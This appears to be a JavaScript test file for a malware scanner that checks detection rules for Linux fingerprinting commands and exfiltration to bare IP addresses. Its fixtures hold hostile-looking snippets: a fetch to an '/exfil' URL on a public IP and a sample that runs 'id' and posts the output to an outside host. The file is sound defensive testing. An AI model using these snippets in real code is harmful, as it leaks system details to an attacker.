'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert, runScanDirect } = require('../test-utils');

function createTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-ast-recon-'));
}
function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}
async function writeAndScan(jsBody) {
  const tmp = createTempDir();
  try {
    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'recon-fixture', version: '1.0.0' }));
    fs.writeFileSync(path.join(tmp, 'index.js'), jsBody);
    return await runScanDirect(tmp);
  } finally {
    cleanup(tmp);
  }
}

async function runAstReconTests() {
  console.log('\n=== AST RECON TESTS (Track D) ===\n');

  // ── linux_fingerprint_exec ────────────────────────────────────────────────

  await asyncTest('AST-093: execSync("id") fires linux_fingerprint_exec', async () => {
    const result = await writeAndScan(`const { execSync } = require('child_process'); execSync('id');`);
    const fp = (result.threats || []).find(t => t.type === 'linux_fingerprint_exec');
    assert(fp, 'should detect linux_fingerprint_exec on execSync("id")');
    assert(fp.severity === 'HIGH', 'severity should be HIGH');
  });

  await asyncTest('AST-093: spawn("uname", ["-a"]) fires linux_fingerprint_exec', async () => {
    const result = await writeAndScan(`const { spawn } = require('child_process'); spawn('uname', ['-a']);`);
    const fp = (result.threats || []).find(t => t.type === 'linux_fingerprint_exec');
    assert(fp, 'should detect linux_fingerprint_exec on spawn("uname", ...)');
  });

  await asyncTest('AST-093: execSync("lsb_release -a") fires linux_fingerprint_exec', async () => {
    const result = await writeAndScan(`const { execSync } = require('child_process'); execSync('lsb_release -a');`);
    const fp = (result.threats || []).find(t => t.type === 'linux_fingerprint_exec');
    assert(fp, 'should detect linux_fingerprint_exec on execSync("lsb_release -a")');
  });

  await asyncTest('AST-093: execSync("echo hello") does NOT fire linux_fingerprint_exec', async () => {
    const result = await writeAndScan(`const { execSync } = require('child_process'); execSync('echo hello');`);
    const fp = (result.threats || []).find(t => t.type === 'linux_fingerprint_exec');
    assert(!fp, 'should not detect linux_fingerprint_exec on non-recon commands');
  });

  // ── direct_ip_exfil ───────────────────────────────────────────────────────

  await asyncTest('AST-094: http.request with bare IPv4 (203.0.113.99) fires direct_ip_exfil', async () => {
    // The IP is in a string literal — handle-literal.js inspects it directly.
    const result = await writeAndScan(`const http = require('http'); const C2 = '203.0.113.99'; http.request({host: C2, port: 8080});`);
    const ip = (result.threats || []).find(t => t.type === 'direct_ip_exfil');
    assert(ip, 'should detect direct_ip_exfil on bare public IPv4 literal');
    assert(ip.severity === 'HIGH', 'severity should be HIGH');
  });

  await asyncTest('AST-094: URL form http://72.62.71.201:8080/x fires direct_ip_exfil', async () => {
    const result = await writeAndScan(`fetch('http://72.62.71.201:8080/exfil');`);
    const ip = (result.threats || []).find(t => t.type === 'direct_ip_exfil');
    assert(ip, 'should detect direct_ip_exfil on http://<IP> URL literal');
  });

  await asyncTest('AST-094: localhost (127.0.0.1) does NOT fire direct_ip_exfil', async () => {
    const result = await writeAndScan(`const http = require('http'); http.get({host: '127.0.0.1', port: 3000});`);
    const ip = (result.threats || []).find(t => t.type === 'direct_ip_exfil');
    assert(!ip, 'should not detect direct_ip_exfil on 127.x');
  });

  await asyncTest('AST-094: AWS IMDS (169.254.169.254) does NOT fire direct_ip_exfil', async () => {
    const result = await writeAndScan(`const http = require('http'); http.get({host: '169.254.169.254', path: '/latest/meta-data/'});`);
    const ip = (result.threats || []).find(t => t.type === 'direct_ip_exfil');
    assert(!ip, 'should not detect direct_ip_exfil on link-local 169.254/16 (cloud IMDS — covered by other rules)');
  });

  await asyncTest('AST-094: RFC 1918 private (192.168.1.1) does NOT fire direct_ip_exfil', async () => {
    const result = await writeAndScan(`const http = require('http'); http.get({host: '192.168.1.1'});`);
    const ip = (result.threats || []).find(t => t.type === 'direct_ip_exfil');
    assert(!ip, 'should not detect direct_ip_exfil on RFC 1918 private 192.168.x');
  });

  await asyncTest('AST-094: invalid octet (999.999.999.999) does NOT fire direct_ip_exfil', async () => {
    const result = await writeAndScan(`const x = '999.999.999.999';`);
    const ip = (result.threats || []).find(t => t.type === 'direct_ip_exfil');
    assert(!ip, 'should not detect direct_ip_exfil on invalid octet values');
  });

  // ── recon_exfil_direct_ip compound ────────────────────────────────────────

  await asyncTest('COMPOUND-016: both signals in same file fires recon_exfil_direct_ip', async () => {
    const body = `
      const { execSync } = require('child_process');
      const http = require('http');
      const fp = execSync('id').toString();
      const body = JSON.stringify({ fp });
      const req = http.request({ host: '203.0.113.99', port: 8080 }, () => {});
      req.write(body); req.end();
    `;
    const result = await writeAndScan(body);
    const compound = (result.threats || []).find(t => t.type === 'recon_exfil_direct_ip');
    assert(compound, 'should fire recon_exfil_direct_ip compound when both linux_fingerprint_exec and direct_ip_exfil are in the same file');
    assert(compound.severity === 'CRITICAL', 'compound should be CRITICAL');
  });
}

module.exports = { runAstReconTests };
